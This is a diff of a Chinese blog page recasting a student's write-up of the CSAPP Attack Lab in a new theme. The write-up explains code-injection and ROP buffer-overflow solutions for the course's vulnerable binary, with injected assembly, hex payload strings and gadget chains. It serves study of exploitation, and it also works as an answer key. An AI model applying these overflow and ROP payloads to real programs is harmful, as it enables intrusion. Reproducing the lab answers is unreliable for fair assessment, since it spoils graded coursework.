@@ -1,98 +1,285 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>jjppp | Blog of jjppp</title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
 
-    
-<link rel="stylesheet" href="/css/style.css">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
+<link rel="stylesheet" href="/css/main.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="post-header">
-    <a class="logo" href="/">jjppp</a>
-    <a class="go-home" href="/">
-        <svg width="8" height="14" viewBox="0 0 8 14">
-            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="佛了，写到lab3才知道有writeup这种东西...  # CI Part --- ## touch1  ---  很简单的题，但是做了很久才发现是数错了的问题....面壁中  &#96;&#96;&#96; asm 00000000004017a8 :   4017a8:	48 83 ec 28          	sub    $0x28,%rsp   4017ac:	48 89 e7             	m">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP实验3 : attacklab">
+<meta property="og:url" content="http://example.com/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/index.html">
+<meta property="og:site_name" content="jjppp">
+<meta property="og:description" content="佛了，写到lab3才知道有writeup这种东西...  # CI Part --- ## touch1  ---  很简单的题，但是做了很久才发现是数错了的问题....面壁中  &#96;&#96;&#96; asm 00000000004017a8 :   4017a8:	48 83 ec 28          	sub    $0x28,%rsp   4017ac:	48 89 e7             	m">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-02-04T10:43:00.000Z">
+<meta property="article:modified_time" content="2022-06-19T01:36:58.154Z">
+<meta property="article:author" content="jpwang">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/","path":"2021/02/04/CSAPP实验3-attacklab/","title":"CSAPP实验3 : attacklab"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CSAPP实验3 : attacklab | jjppp</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">jjppp</p>
+      <i class="logo-line"></i>
     </a>
+      <p class="site-subtitle" itemprop="description">Blog of jjppp</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
 </div>
-                
-                <div class="post-main">
 
-    
-        <div class="post-main-title">
-            CSAPP实验3 : attacklab
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
         </div>
-        <div class="post-meta">
-            2021-02-04
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">jpwang</p>
+  <div class="site-description" itemprop="description">Young, Simple & Naive</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">84</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
         </div>
-    
-
-    
-      
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-      processEscapes: true,
-      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    }
-  });
-  MathJax.Hub.Queue(function() {
-    var all = MathJax.Hub.getAllJax(), i;
-    for(i=0; i < all.length; i += 1) {
-        all[i].SourceElement().parentNode.className += ' has-jax';
-    }
-  });
-</script>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@2.7.8/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
 
 
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CSAPP实验3 : attacklab | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSAPP实验3 : attacklab
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-04 18:43:00" itemprop="dateCreated datePublished" datetime="2021-02-04T18:43:00+08:00">2021-02-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
     
     
-    <div class="post-md">
+    
+    <div class="post-body" itemprop="articleBody">
         <p>佛了，写到lab3才知道有writeup这种东西… # CI Part — ## touch1 — 很简单的题，但是做了很久才发现是数错了的问题….面壁中 ``` asm 00000000004017a8 : 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq ``` 重点在对`%rsp`的操作，这里留出了`40byte`的位置给`buffer`，我们只需要输入40+8长度的字符串就可以成功修改到返回地址了 `touch1`的地址是`0x004017c0`，根据**little endian**的规则，前面40个无所谓，后面8个是`c0 17 40 00 00 00 00 00`就可以了（注意跳转地址是64位的），事实上我一开始只写了4个也是对的… 这里非常坑爹，输入只能是`00`而不能是`0`… 一开始错是因为把8个分成了一组，这样4组就只有32个，面壁中… ## touch2 — 这个比起上面有一点难度 具体的`getbuf`和上面没有区别，重点在于我们需要用`cookie`的值给寄存器`%rdi`赋值，然后再跳转到`touch2`中 我们可以先写好汇编代码，再利用`gcc -c test.s`来得到`test.o`二进制文件，然后`objdump -d test.o &gt; test.d`就可以得到对应指令的编码了，放在40个中的随便哪个位置，最后在栈的返回位置写入我们注入代码的起始地址就好了 查看起始地址可以gdb进去观察`%rsp`的值，然后画图就好了。只需要记住栈向低处增长、命令从低处开始执行、字符串从低处开始写入内存 写出来的汇编大概长这样，不同的cookie写出来肯定也不一样： ``` asm movq $0x59b997fa,%rdi pushq $0x4017ec ret ``` ## touch3 — 有了writeup就很好做啦 查文档可以知道```sprintf(str, “%.8x”, x)```表示把`x`以16进制、占8位打印到`str`指向的地址处，那么我们就是要在注入的代码中带上自己的cookie，然后传入这个cookie字符串的起始地址 writeup提示`hexmatch`和其他函数会重新占用`getbuf`所产生stack frame的内存，但是由于这两者是同级的（意会一下这个我瞎说的概念），因此`getbuf`往上一层函数的stack frame就不会被修改到，所以我们把cookie存在这个地方。当然你慢慢看代码发现`getbuf`的stack frame被用的一滴都不剩了再打其他地方的注意也不是不行…. ``` asm 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 8b dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 ``` 自此code injection的部分就做完啦~ 撒花 ~ # ROP Part — ## touch2 — ROP比CI要好玩得多，适用性也更广，<del>会让开发者有一种被自己代码NTR的感觉</del> 考虑怎么实现传入参数。虽然我们无法直接注入可执行的代码，但是我们可以注入需要的数据，再利用类似`popq`的指令从栈上取出需要的数据 一个观察`farm.c`的好方法是先得到`farm.d`，再找到所有的`ret`指令（指令长度为一、指令唯一），那么我们就可以得到一系列以`ret`结尾的指令片段 我们需要的部分必定是若干指令片段的一个后缀（这个十分显然），于是大概写一个汇编，然后对着表查就好了。 比如说实现传参的话一定要有一个带`%rdi`的指令、取出数据一定要有一个`popq`指令、再说下去就把答案泄露了….. 写出来大概是介样： ``` asm f3 0f 1e fa 55 48 89 e5 b8 fb 78 90 90 5d c3 f3 0f 1e fa 55 48 89 e5 89 7d fc 8b 45 fc 2d b8 76 38 3c 5d c3 f3 0f 1e fa 55 48 89 e5 89 7d fc 8b 45 fc 2d af 8c a7 6f 5d c3 f3 0f 1e fa 55 48 89 e5 48 89 7d f8 48 8b 45 f8 c7 00 48 89 c7 c7 90 5d c3 f3 0f 1e fa 55 48 89 e5 48 89 7d f8 48 8b 45 f8 c7 00 54 c2 58 92 90 5d c3 f3 0f 1e fa 55 48 89 e5 48 89 7d f8 48 8b 45 f8 c7 00 63 48 8d c7 90 5d c3 f3 0f 1e fa 55 48 89 e5 48 89 7d f8 48 8b 45 f8 c7 00 48 89 c7 90 90 5d c3 f3 0f 1e fa 55 48 89 e5 b8 29 58 90 c3 5d c3 mine: 58 popq %rax 90 nop c3 ret 48 89 c7 movq %rax,%rdi 90 nop 90 nop 5d popq %rbp c3 ret ``` 这里的代码地址是固定的，所以比较好跳转。如果代码地址随机还可以用上所谓的“雪橇序列”小技巧（我瞎翻的一个术语）来实现较大概率命中我们想要的gadgets。 ## touch3 — 做完辣 注意到难点在于栈的位置随机，但是我们可以发现栈的相对位置不变，并且由附录可以很容易得到`%rsp`，那么我们只需要提前取出`%rsp`，用它加上一个合适的`delta`得到注入的字符串的地址，再同样跳转到`touch3`就可以了 阅读`farm.c`可以看到这么一个函数 ```c &#x2F;* Add two arguments *&#x2F; long add_xy(long x, long y) { return x+y; } ``` 这玩意就在`mid`后面，而且还有注释….这重要性还要我说嘛 然后根据一些小技巧（比如说一定要用上`functional nop`和`movl`，比如说`movl`一定用在传输`delta`上（我们操作的其他值都是地址，必须要`movq`））就可以找到一些一定要用上的片段，它们恰好就构成了一条数据传输链，写出来大概是这样的 ``` asm mine: movq %rsp,%rax; 48 89 e0 90 c3 movq %rax,%rdi; 48 89 c7 c3 ;上面一段用来取出%rdi popq %rax; 58 90 c3 movl %eax,%edx; 89 c2 90 c3 movl %edx,%ecx; 89 d1 38 c9 c3 movl %ecx,%esi; 89 ce 38 c0 c3 ;上面一段用来取出%rsi ret; c3 这里用来调用 movq %rax,%rdi; 48 89 c7 c3 这里就是传参啦 ``` 然后就很简单了，只需要找`delta`的值就行了。这个可以gdb进去直接扫内存看差值</p>
 <!-- more -->
 
     </div>
 
-</div>
+    
+    
+    
 
-                <div class="footer">
-    <span>Copyright © 2022 jjppp</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這Li</a></span>
-</div>
+    <footer class="post-footer">
 
+        
 
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
-
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/24/CSAPP%E5%AE%9E%E9%AA%8C2-bomblab/" rel="prev" title="CSAPP实验2 : bomblab">
+                  <i class="fa fa-chevron-left"></i> CSAPP实验2 : bomblab
+                </a>
             </div>
-        </div>
-    </body>
+            <div class="post-nav-item">
+                <a href="/2021/02/08/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%B8%B8%E8%A7%81%E8%AF%81%E6%98%8E/" rel="next" title="高等代数复习笔记 常见证明">
+                  高等代数复习笔记 常见证明 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">jpwang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
 </html>
